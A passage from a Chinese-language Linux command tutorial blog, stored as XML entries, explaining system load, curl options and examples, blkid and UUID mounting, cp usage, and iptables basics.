&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第一个数值表示1分钟内系统的平均负载值；第二个数值表示5分钟内系统的平均负载值；第三个数值表示15分钟系统的平均负载值。这个值的意义是，单位时间段内CPU活动进程数。当然这个值越大就说明服务器压力越大。一般情况下这个值只要不超过服务器的cpu数量就没有关系，如果服务器cpu数量为8，那么这个值若小于8，就说明当前服务器没有压力，否则就要关注一下了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;怎么查看服务器有几个cpu &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1grep -c 'processor' /proc/cpuinfo &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;‘/proc/cpuinfo’ 这个文件记录了cpu的详细信息。目前市面上的服务器通常都是2颗4核cpu，在linux看来，它就是8个cpu。查看这个文件时则会显示8段类似的信息，而最后一段信息中processor : 后面跟的是 ‘7’ 所以查看当前系统有几个cpu，我们可以使用这个命令： grep -c ‘processor’ /proc/cpuinfo 而如何看几颗物理cpu呢，需要查看关键字 “physical id” &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;另外，uptime命令同样可以查看系统负载。实际上uptime得出的结果和w的第一行是一致的。 备注1) 区别于who命令，w命令不仅可以看到登录服务器的用户信息，而且可以看到这些用户做了什么2) who am i命令，显示出自己在系统中的用户名，登录终端，登录时间3) whoami命令，显示自己在系统中的用户名4) logname命令，可以显示自己初次登录到系统中的用户名，主要识别sudo前后情形5) last命令，查看最近1个月用户登录服务器的情况6) tty命令，来查看所连接的设备或终端]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- curl]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F84.%20Linux%20%E5%91%BD%E4%BB%A4-%20curl%2F</url>
    <content type="text"><![CDATA[Linux 命令- curl&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;curl是Linux系统命令行下用来简单测试web访问的工具，是一个利用URL规则在命令行下工作的文件传输工具。它支持文件的上传和下载。 命令参数&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;curl命令参数很多。 -a/–append 上传文件时，附加到目标文件 -A:随意指定自己这次访问所宣称的自己的浏览器信息 -b/–cookie cookie字符串或文件读取位置，使用option来把上次的cookie信息追加到http request里面去。 -c/–cookie-jar 操作结束后把cookie写入到这个文件中 -C/–continue-at 断点续转 -d/–data HTTP POST方式传送数据 –data-ascii 以ascii的方式post数据 –data-binary 以二进制的方式post数据 –negotiate 使用HTTP身份验证 –digest 使用数字身份验证 –disable-eprt 禁止使用EPRT或LPRT –disable-epsv 禁止使用EPSV -D/–dump-header 把header信息写入到该文件中 –egd-file 为随机数据(SSL)设置EGD socket路径 –tcp-nodelay 使用TCP_NODELAY选项 -e/–referer 指定引用地址 -F/–form 模拟http表单提交数据 –form-string 模拟http表单提交数据 -G/–get 以get的方式来发送数据 -H/–header 指定请求头参数 –ignore-content-length 忽略的HTTP头信息的长度 -i/–include 输出时包括protocol头信息 -I/–head 仅返回头部信息，使用HEAD请求 -k/–insecure 允许不使用证书到SSL站点 -K/–config 指定的配置文件读取 -l/–list-only 列出ftp目录下的文件名称 –limit-rate 设置传输速度 –local-port 强制使用本地端口号 -m/–max-time 指定处理的最大时长 –max-redirs 设置最大读取的目录数 –max-filesize 设置最大下载的文件总量 -o/–output 指定输出文件名称 -O/–remote-name 把输出写到该文件中，保留远程文件的文件名 -v/–verbose 小写的v参数，用于打印更多信息，包括发送的请求信息，这在调试脚本是特别有用。 -s/–slient 减少输出的信息，比如进度 –connect-timeout 指定尝试连接的最大时长 -x/–proxy 指定代理服务器地址和端口，端口默认为1080 -u/–user 设置服务器的用户和密码 -r/–range 检索来自HTTP/1.1或FTP服务器字节范围 –range-file 读取（SSL）的随机文件 -R/–remote-time 在本地生成文件时，保留远程文件时间 –retry 指定重试次数 –retry-delay 传输出现问题时，设置重试间隔时间 –retry-max-time 传输出现问题时，设置最大重试时间 -s/–silent 静默模式。不输出任何东西 -S/–show-error 显示错误 –socks4 用socks4代理给定主机和端口 –socks5 用socks5代理给定主机和端口 –stderr -x/–proxy 在给定的端口上使用HTTP代理 -X/–request 指定什么命令。curl默认的HTTP动词是GET，使用-X参数可以支持其他动词。 -T/–upload-file 指定上传文件路径 命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;curl命令是一个功能强大的网络工具，它能够通过http、ftp等方式下载文件，也能够上传文件，同时支持HTTPS等众多协议，还支持POST、cookies、认证、从指定偏移处下载部分文件、用户代理字符串、限速、文件大小、进度条等特征。其实curl远不止前面所说的那些功能，大家可以通过man curl阅读手册页获取更多的信息。类似的工具还有wget。curl命令使用了libcurl库来实现，libcurl库常用在C程序中用来处理HTTP请求，curlpp是libcurl的一个C++封装，这几个东西可以用在抓取网页、网络监控等方面的开发，而curl命令可以帮助来解决开发过程中遇到的问题。 常用命令1.-x指定ip和端口，省略写hosts，方便使用1[root@localhost ~]# curl -xip:port www.baidu.com 2.-I可以把当前的内容略掉，只显示状态码，-v可以显示详细过程1[root@localhost ~]# curl -Iv http://www.qq.com 3.-u可以指定用户名和密码1[root@localhost ~]# curl -u user:password http://123.com 4.-O直接下载页面或者对象1[root@localhost ~]# curl http://study.lishiming.net/index.heml -O 5.-o自定义名字1[root@localhost ~]# curl -o index2 http://study.lishiming.net/index.heml 使用实例实例1：读取网页1curl http://www.linuxidc.com 实例2：保存网页-o：将文件保存为命令行中指定的文件名的文件中1curl -o page.html http://www.linuxidc.com.html -O：使用URL中默认的文件名保存文件到本地1curl -O http://linuxidc.com.html 其他：可以使用 &gt; 进行输出1curl http://www.linuxidc.com &gt; page.html 实例3：使用proxy服务器及其端口：-x1curl -x 123.45.67.89:1080 -o page.html http://www.linuxidc.com 实例4：使用cookie来记录session信息1curl -x 123.45.67.89:1080 -o page.html -D cookie0001.txt http://www.linuxidc.com &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个option： -D是把http的response里面的cookie信息存到一个特别的文件中去， &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这样，当页面被存到page.html的同时，cookie信息也被存到了cookie0001.txt里面了 实例5：下次访问的时候，使用iption把上次的cookie信息追加到http request里面去：-b1curl -x 123.45.6789:1080 -o page1.html -D cookie0002.txt -b cookie0001.txt http://www.linuxidc.com 实例6：浏览器信息1curl -A "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)" -x 123.45.67.89:1080 -o page.html -D cookie0001.txt http://www.linuxidc.com 实例7：referer1curl -A "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)" -x 123.45.67.89:1080 -e "mail.linuxidc.com" -o page.html -D cookie0001.txt http://www.linuxidc.com &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这样就可以骗对方的服务器，你是从mail.linuxidc.com点击某个连接过来的。 实例8：下载文件12curl -o 1.jpg http://cgi2.tky.3web.ne.jp/~zzh/screen1.JPGcurl -O http://cgi2.tky.3web.ne.jp/~zzh/screen1.JPG &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-O可以按照服务器上的文件名，自动存在本地 1curl -O http://cgi2.tky.3web.ne.jp/~zzh/screen[1-10].JPG 实例9：批量下载1curl -O http://cgi2.tky.3web.ne.jp/~&#123;zzh,nick&#125;/[001-201].JPG &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这样产生的下载就是： 12345678~zzh/001.JPG~zzh/002.JPG...~zzh/201.JPG~nick/001.JPG~nick/002.JPG...~nick/201.JPG &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;自定义文件名的批量下载 1curl -o #2_#1.jpg http://cgi2.tky.3web.ne.jp/~&#123;zzh,nick&#125;/[001-201].JPG &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这样，自定义出来下载下来的文件名就变成了这样： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;原来：~zzh/001.JPG –&gt; 下载后： 001-zzh.JPG 原来： ~nick/001.JPG –&gt; 下载后： 001-nick.JPG &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这样就不怕文件重名了。 实例10：断点续传1curl -c -O http://cgi2.tky.3wb.ne.jp/~zzh/screen1.JPG 实例11：使用-r 分块下载&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;比如有一个 http://cgi2.tky.2web.ne.jp/~zzh/zhao1.MP3 要下载。就可以用这样的命令： 1234curl -r 0-10240 -o "zhao.part1" http:/cgi2.tky.3web.ne.jp/~zzh/zhao1.MP3 &amp;\curl -r 10241-20480 -o "zhao.part1" http:/cgi2.tky.3web.ne.jp/~zzh/zhao1.MP3 &amp;\curl -r 20481-40960 -o "zhao.part1" http:/cgi2.tky.3web.ne.jp/~zzh/zhao1.MP3 &amp;\curl -r 40961- -o "zhao.part1" http:/cgi2.tky.3web.ne.jp/~zzh/zhao1.MP3 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这样就可以分块下载了。不过需要自己把这些破碎的文件合并起来，如果用UNIX或者苹果，用 cat zhao.part* &gt; zhao.MP3 就可以了；如果用的windows 用 copy /b 来解决。 实例12：使用FTP协议下载&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;上面都是http协议的下载，其实ftp也一样可以用。 1curl -u name:passwd ftp://ip:port/path/file &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;或者 1curl ftp://name:passwd@ip:port/path/file 实例13：使用-T上传向ftp传一个文件：1curl -T localfile -u name:passwd ftp://upload_site:port/path/ 向http服务器上传文件1curl -T localfile http://cgi2.tky.3web.ne.jp/~zzh/abc.cgi &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意，这个时候，使用协议是HTTP的PUT method 实例14：POST和GET模式&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说到PUT，自然还有其它几种methos，POST和GET 1curl http://www.linuxidc.com/login.cgi?user=nickwolfe&amp;password=12345 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;POST模式的option是-d 1curl -d "user=nickwolfe&amp;password=12345" http://www.linuxidc.com/login.cgi &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;需要注意的是，POST模式下的文件上传，比如一个HTTP表单，要用curl进行模拟，就该是: 1curl -F upload=@localfile -F nick=go http://cgi2.tky.3web.ne.jp/~zzh/up_file.cgi 实例15：http本地证书1curl -E localcert.pem https://remote_server 实例16：使用curl通过dict协议去查字典1curl dict://dict.org/d:computer 实例17：获取服务端的信息，比如获取web Server的类型（apache/nginx）以及版本，php的版本等等1curl -i http://example.com/ 实例18：curl指定用户以及密码访问&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;有时候，访问一个网页时是需要认证的，也就是说需要输入正确的用户名以及密码信息，否则会包401的错误 1curl -u user:password http://www.linuxidc.com/study/ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这样就可以了 实例19：在linux上使用curl访问网站，指定主机IP&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在linux的命令窗口下，无法使用浏览器去浏览网站，但是可以用curl访问html代码。有时，为了指定某个域名的IP，需要写hosts，比较费事。可以临时用curl命令指定一个IP 1curl www.example.com -x192.168.0.111:80 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用 -x 选项指定主机IP，这种方法类似与IE设置了一个代理服务器。但有时候（访问https时）这样访问不太好用，可以使用： 1curl -H "Host:www.abc.com" https://192.168.0.111/aaa.txt]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- blkid]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F76.%20Linux%20%E5%91%BD%E4%BB%A4-%20blkid%2F</url>
    <content type="text"><![CDATA[Linux 命令- blkid&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在日常的运维工作中遇到过这样的情况，一台服务器上新装了两块磁盘，磁盘a（在服务器上显示为sdc）和磁盘b（在服务器上显示为sdd），有一次把这两块磁盘都拔掉了，然后再重新插上，重启机器，结果磁盘编号调换了，a变成了sdd，b变成了sdc（这是因为把磁盘插错了插槽），问题来了。通过上边的学习，你挂载磁盘是通过/dev/hdb1 这样的分区名字来挂载的，如果先前加入到了/etc/fstab 中，结果系统启动后则会挂载错分区。那么怎么样避免这样的情况发生？ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这就用到了UUID，可以通过 blkid 命令获取各分区的UUID: 12345/dev/sda1: UUID="a593ff68-2db7-4371-8d8c-d936898e9ac9" TYPE="ext4"/dev/sda2: UUID="ff042a91-b68f-4d64-9759-050c51dc9e8b" TYPE="swap"/dev/sda3: UUID="95297b81-538d-4d96-870a-de90255b74f5" TYPE="ext4"/dev/sdb5: LABEL="TEST" UUID="c61117ca-9176-4d0b-be4d-1b0f434359a7" TYPE="ext4"/dev/sdb6: UUID="c271cb5a-cb46-42f4-9eb4-d2b1a5028e18" SEC_TYPE="ext2" TYPE="ext3" &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这样可以获得全部磁盘分区的UUID，如果格式化的时候指定了 LABEL 则该命令也会显示LABEL值，甚至连文件系统类型也会显示。当然这个命令后面也可以指定哪个分区： 12[root@localhost ~]# blkid /dev/sdb5/dev/sdb5: LABEL="TEST" UUID="c61117ca-9176-4d0b-be4d-1b0f434359a7" TYPE="ext4" &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;获得UUID后，如何使用它呢？ 12345678[root@localhost ~]# umount /newdir[root@localhost ~]# mount UUID="c61117ca-9176-4d0b-be4d-1b0f434359a7" /newdir[root@localhost ~]# df -h文件系统 容量 已用 可用 已用%% 挂载点/dev/sda3 14G 1.5G 12G 11% /tmpfs 160M 0 160M 0% /dev/shm/dev/sda1 97M 27M 66M 29% /boot/dev/sdb5 989M 18M 921M 2% /newdir &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;也可以把下面这行写到 /etc/fstab 中 1UUID=c61117ca-9176-4d0b-be4d-1b0f434359a7 /newdir ext4 defaults 0 0 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果想让某个分区开机后就自动挂载，有两个办法可以实现： 在 /etc/fstab 中添加一行，如上例中那行； 把挂载命令写到 /etc/rc.d/rc.local 文件中去，阿铭会经常把想要开机启动的命令加到这个文件中。系统启动完后会执行这个文件中的命令，所以只要你想开机后运行什么命令统统写入到这个文件下面吧，直接放到最后面即可，阿铭把挂载的命令放到该文件的最后一行了： 123456789[root@localhost ~]# cat /etc/rc.d/rc.local#!/bin/sh## This script will be executed *after* all the other init scripts.# You can put your own initialization stuff in here if you don't# want to do the full Sys V style init stuff.touch /var/lock/subsys/localmount UUID="c61117ca-9176-4d0b-be4d-1b0f434359a7" /newdir &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以上两种方法，任选其一，介绍第二种方法其实也是一个小知识，如何让一些操作行为随系统启动而自动执行。另外一个小建议，那就是挂载磁盘分区的时候，尽量使用UUID或者LABEL这两种方法。]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- cp]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F9.%20Linux%20%E5%91%BD%E4%BB%A4-%20cp%2F</url>
    <content type="text"><![CDATA[Linux 命令- cp&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;cp命令用来复制文件或者目录，是Linux系统中最常用的命令之一。一般情况下，shell会设置一个别名，在命令行下复制文件时，如果目标文件已经存在，就会询问是否覆盖，不管你是否使用-i参数。但是如果是在shell脚本中执行cp时，没有-i参数时不会询问是否覆盖。这说明命令行和shell脚本的执行方式有些不同。 1．命令格式：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用法： 1cp [选项] [-T] [源] [目的] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;或： 1cp [选项] [源] [目录] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;或: 1cp [选项] [-t] [目录] [源] 2．命令功能：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;将源文件复制至目标文件，或将多个源文件复制至目标目录。 3．命令参数： -a, –archive 等于-dR –preserve=all –backup[=CONTROL 为每个已存在的目标文件创建备份 -b 类似–backup 但不接受参数 –copy-contents 在递归处理是复制特殊文件内容 -d 等于–no-dereference –preserve=links -f, –force 如果目标文件无法打开则将其移除并重试(当 -n 选项 存在时则不需再选此项) -i, –interactive 覆盖前询问(使前面的 -n 选项失效) -H 跟随源文件中的命令行符号链接 -l –link 链接文件而不复制 -L –dereference 总是跟随符号链接 -n –no-clobber 不要覆盖已存在的文件(使前面的 -i 选项失效) -P –no-dereference 不跟随源文件中的符号链接 -p 等于–preserve=模式,所有权,时间戳 –preserve[=属性列表 保持指定的属性(默认：模式,所有权,时间戳)，如果可能保持附加属性：环境、链接、xattr 等 -R, -r, –recursive 复制目录及目录内的所有项目 4．命令实例：实例1：复制单个文件到目标目录，文件在目标文件中不存在&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1cp log.log test5 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 123456789101112[root@localhost test]# cp log.log test5[root@localhost test]# ll-rw-r--r-- 1 root root 0 10-28 14:48 log.logdrwxr-xr-x 6 root root 4096 10-27 01:58 scfdrwxrwxrwx 2 root root 4096 10-28 14:47 test3drwxr-xr-x 2 root root 4096 10-28 14:53 test5[root@localhost test]# cd test5[root@localhost test5]# ll-rw-r--r-- 1 root root 0 10-28 14:46 log5-1.log-rw-r--r-- 1 root root 0 10-28 14:46 log5-2.log-rw-r--r-- 1 root root 0 10-28 14:46 log5-3.log-rw-r--r-- 1 root root 0 10-28 14:53 log.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在没有带-a参数时，两个文件的时间是不一样的。在带了-a参数时，两个文件的时间是一致的。 实例2：目标文件存在时，会询问是否覆盖&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1cp log.log test5 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 12345678910[root@localhost test]# cp log.log test5cp：是否覆盖“test5/log.log”? n[root@localhost test]# cp -a log.log test5cp：是否覆盖“test5/log.log”? y[root@localhost test]# cd test5/[root@localhost test5]# ll-rw-r--r-- 1 root root 0 10-28 14:46 log5-1.log-rw-r--r-- 1 root root 0 10-28 14:46 log5-2.log-rw-r--r-- 1 root root 0 10-28 14:46 log5-3.log-rw-r--r-- 1 root root 0 10-28 14:48 log.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;目标文件存在时，会询问是否覆盖。这是因为cp是cp -i的别名。目标文件存在时，即使加了-f标志，也还会询问是否覆盖。 实例3：复制整个目录&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1cp -a test3 test5 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;目标目录存在时： 12345678910111213[root@localhost test]# cp -a test3 test5 [root@localhost test]# ll-rw-r--r-- 1 root root 0 10-28 14:48 log.logdrwxr-xr-x 6 root root 4096 10-27 01:58 scfdrwxrwxrwx 2 root root 4096 10-28 14:47 test3drwxr-xr-x 3 root root 4096 10-28 15:11 test5[root@localhost test]# cd test5/[root@localhost test5]# ll-rw-r--r-- 1 root root 0 10-28 14:46 log5-1.log-rw-r--r-- 1 root root 0 10-28 14:46 log5-2.log-rw-r--r-- 1 root root 0 10-28 14:46 log5-3.log-rw-r--r-- 1 root root 0 10-28 14:48 log.logdrwxrwxrwx 2 root root 4096 10-28 14:47 test3 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;目标目录不存在是： 12345678[root@localhost test]# cp -a test3 test4[root@localhost test]# ll-rw-r--r-- 1 root root 0 10-28 14:48 log.logdrwxr-xr-x 6 root root 4096 10-27 01:58 scfdrwxrwxrwx 2 root root 4096 10-28 14:47 test3drwxrwxrwx 2 root root 4096 10-28 14:47 test4drwxr-xr-x 3 root root 4096 10-28 15:11 test5[root@localhost test]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意目标目录存在与否结果是不一样的。目标目录存在时，整个源目录被复制到目标目录里面 实例4：复制的 log.log 建立一个连结档 log_link.log&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1cp -s log.log log_link.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 12345678[root@localhost test]# cp -s log.log log_link.log[root@localhost test]# lllrwxrwxrwx 1 root root 7 10-28 15:18 log_link.log -&gt; log.log-rw-r--r-- 1 root root 0 10-28 14:48 log.logdrwxr-xr-x 6 root root 4096 10-27 01:58 scfdrwxrwxrwx 2 root root 4096 10-28 14:47 test3drwxrwxrwx 2 root root 4096 10-28 14:47 test4drwxr-xr-x 3 root root 4096 10-28 15:11 test5 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;那个 log_link.log 是由 -s 的参数造成的，建立的是一个『快捷方式』，所以您会看到在文件的最右边，会显示这个文件是『连结』到哪里去的！]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iptables详解]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F81.%20iptables%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[iptables详解iptables简介&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;netfilter/iptables（简称为iptables）组成Linux平台下的包过滤防火墙，与大多数的Linux软件一样，这个包过滤防火墙是免费的，它可以代替昂贵的商业防火墙解决方案，完成封包过滤、封包重定向和网络地址转换（NAT）等功能。 iptables基础&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;规则（rules）其实就是网络管理员预定义的条件，规则一般的定义为“如果数据包头符合这样的条件，就这样处理这个数据包”。规则存储在内核空间的信息 包过滤表中，这些规则分别指定了源地址、目的地址、传输协议（如TCP、UDP、ICMP）和服务类型（如HTTP、FTP和SMTP）等。当数据包与规 则匹配时，iptables就根据规则所定义的方法来处理这些数据包，如放行（accept）、拒绝（reject）和丢弃（drop）等。配置防火墙的 主要工作就是添加、修改和删除这些规则。 iptables和netfilter的关系&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;iptables和netfilter的关系是一个很容易让人搞不清的问题，很多知道iptables却不知道netfilter。其实iptables只是Linux防火墙的管理工具而已，位于/sbin/iptbles。真正实现防火墙功能的是netfilter，它是Linux内核中实现包过滤的内部结构。iptables只是netfilter的一个实现工具。 iptables语法格式1iptables [-t 表名] [命令选项] [链名] [条件匹配] [-j 目标动作或跳转] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明：表名、链名、用户指定iptables命令所操作的表和链，命令选项用于指定管理iptables规则的方式（比如：插入、增加、删除、查看等）；条件匹配用户指定对符合什么样条件的数据包进行处理；目标动作或跳转用于指定数据包的处理方式（比如允许通过、拒绝、丢弃、跳转（jump）给其它链处理）。 iptables控制选项基本参数 -A 在指定链的末尾添加（append）一条新的规则 -D 删除（delete）指定链中的某一条规则，可以按规则序号和内容删除 -I 在指定链中插入（insert）一条新的规则，默认在第一行添加 -R 修改、替换（replace）指定链中的某一条规则，可以按规则序号和内容替换 -L 列出（list）指定链中所有的规则进行查看 -E 重命名用户定义的链，不改变链本身 -F 清空（flush） -N 新建（new-chain）一条用户自己定义的规则链 -X 删除指定表中用户自定义的规则链（delete-chain） -P 设置指定链的默认策略（policy） -Z 将所有表的所有链的字节和数据包计数器清零 -n 使用数字形式（numeric）显示输出结果 -v 查看规则表详细信息（verbose）的信息 -V 查看版本(version) -h 获取帮助（help） 描述规则基本参数&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这些规则参数用于描述的协议、源地址、目的地址、允许经过的网络接口，以及如何处理这些数据包。这些描述是对规则的基本描述。 -p （protocol）指定协议，可以是tcp、udp、或者icmp，可以使用 all 来指定所有协议；如果不指定 -p 参数，则默认是 all 值，这并不明智，请总是明确指定协议名称。可以使用协议名（如tcp），或者是协议值（比如6代表tcp）来指定协议，映射关系查看 /etc/protocols ；还可以使用 -protocol 参数代替 -p 参数 -s 源地址（source）指定数据包的源地址；参数可以使用IP地址、网络地址、主机名-s 192.168.1.101 指定IP地址，-s 192.168.1.10/24指定网络地址不指定-s参数，就代表所有地址还可以使用 -src 或者 -source -d 目的地址（destination）指定目的地址参数和-s相同还可以使用 -dst 或者 destination -j 执行目标（jump to target）指定了当与规则（RUle）匹配时如何处理数据包可能的值是ACCEPT允许、DROP丢掉、REJECT拒绝、QUEUE队列、RETURN返回、MASQUERADE伪装（地址伪装，算是snat中的一种特例，可以实现自动化的snat）还可以指定其他连接（Chain）作为目标 -i 输入接口（input initerface）指定要处理来自哪个接口的数据包（一般指定网卡）这些数据包即将进入 INPUT、FORWARD、PREROUTE链例如：-i etho 指定了要处理经由eth0进入的数据包不指定-i参数，那么将处理进入所有接口的数据包如果出现! -i eth0，那么将处理所有经由eth0意外的接口进入的数据包。出现-i eth+，那么将处理所有经由eth开都的接口进入的数据包还可以使用-in-interface参数 -o 输出（out interface）指定数据包由哪个接口输出这些数据包即将进入FORWARD、OUTPUT、PORTROUTING链不指定 -o 选项，那么系统哈斯那个的所有接口都可以作为输出接口出现 ! -o eth0 那么将从 eth0以外的接口 输出出现 ! eth+ ，那么将仅从 eth开头的接口 输出还可以使用 -out-initerface 参数 描述规则扩展参数&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;对规则有了基本描述以后，有时候还希望指定端口、TCP标志、ICMP类型等内容。 –sport 源端口（source port） 针对 -p tcp 或者 -p udp缺省情况下，将匹配所有端口可以指定端口号或者端口名称，（例如，-sport 22 与 -sport ssh）/etc/services 文件描述了上述映射关系从性能上讲，使用端口号更好使用冒号可以匹配端口范围，如“-sport 22:100”还可以使用 -source-port –dport 目的端口（destination port） 针对 -p tcp 或者 -p udp参数和-sport类似还可以使用 -destination-port –tcp-flage TCP标志 针对 -p tcp可以指定由逗号分割的多个参数有效值可以是：SYN、ACK、FIN、RST、URG、PSH可以使用 ALL 或者 NONE –icmp-type ICMP类型 针对 -p icmp–icmp-type 0 表示Echo Reply–icmp-type 8 表示Echo iptables处理数据包的四种方式 ACCEPT 允许数据包通过 DROP 直接丢弃数据包，不给任何回应信息 REJECT 拒绝数据包通过，必要时会给数据发送端一个响应的信息。 LOG在/var/log/messages文件中记录日志信息，然后将数据包传递给下一条规则 iptables传输数据包的过程 当一个数据包进入网卡时，它首先进入PREROUTING链，内核根据数据包目的IP判断是否需要转送出去。 如果数据包就是进入本机的，它就会沿着图向下移动，到达INPUT链。数据包到了INPUT链后，任何进程都会收到它。本机上运行的程序可以发送数据包，这些数据包会经过OUTPUT链，然后到达POSTROUTING链输出。 如果数据包是要转发出去的，且内核允许转发，数据包就会如图所示向右移动，经过FORWARD链，然后到达POSTROUTING链输出。 iptables的规则表和链&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;表（tables）提供的特定的功能，iptables内置了4个表，即filter表、nat表、mangle表、和raw表，分别用于实现包过滤，网络地址转换、包重构（修改）和数据跟踪处理。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;链（chains）是数据包传播的路径，每一条链其实就是众多规则中的一个检查清单，每一条链中可以有一条或数条规则。当一个数据包到达一个链时，iptables就会从链中第一条规则开始检查，看该数据包是否满足规则所定义的条件。如果满足，系统就会根据该条规则所定义的方法处理该数据包；否则iptables将继续检查下一条规则，如果该数据包不符号链中任一条规则，iptables就会根据该链预先定义的默认策略来处理数据包。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;iptables采用“表”和“链”的分层结构。在REHL4中是三张表五个链。现在REHL5成了四张表五个链了，不过多出来的哪个表用的也不太多，所以基本还是和以前一样。下面是四张表五个链。需要明白这些表和链的关系及作用。 规则表 filter表——三个链：INPUT、FORWARD、OUTPUT作用：过滤数据包，内核模块：iptables=_filter Nat表——三个链：PREROUTING、POSTROUTING、OUTPUT作用：用于网络地址转换（IP、端口），内核模块：iptable_nat Mangle表——五个链：PREROUTING、POSTROUTING、INPUT、OUTPUT、FORWARD作用：修改数据包的服务类型、TTL，并且可以配置路由实现QOS，内核模块：iptable_mangle（设置策略时几乎不会用到它） Raw表——两个链：OUTPUT、PREROUTING作用：决定数据包是否被状态跟踪机制处理，内核模块：iptable_raw（用得不多） 规则链 INPUT——进来的数据包应用此规则链中的策略 OUTPUT——外出的数据包应用此规则链中的策略 ROEWARD——转发数据包时应用此规则链中的策略 PREROUTING——对数据包做路由选择前应用此链中的规则（所有的数据包进来的时候都先由这个链处理） POSTROUTING——对数据包作路由选择后应用此链中的规则（所有的数据包出来的时候都先由这个链处理） 规则表之间的有限顺序&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Raw——Mangle——Nat——Filter &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;规则链之间的优先顺序分三种情况 1、入站数据流向&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;从外界达到防火墙的数据包，先被PREROUTING规则链处理（是否修改数据包地址等），之后会进行路由选择（判断该数据包应该发往何处），如果数据包的目标主机是防火墙本机（比如说internet用户访问防火墙主机中的web服务器的数据包）， 那么内核将其传给INPUT链进行处理（决定是否允许通过等），通过以后再给系统上层的应用程序（比如apache服务器）进行响应。 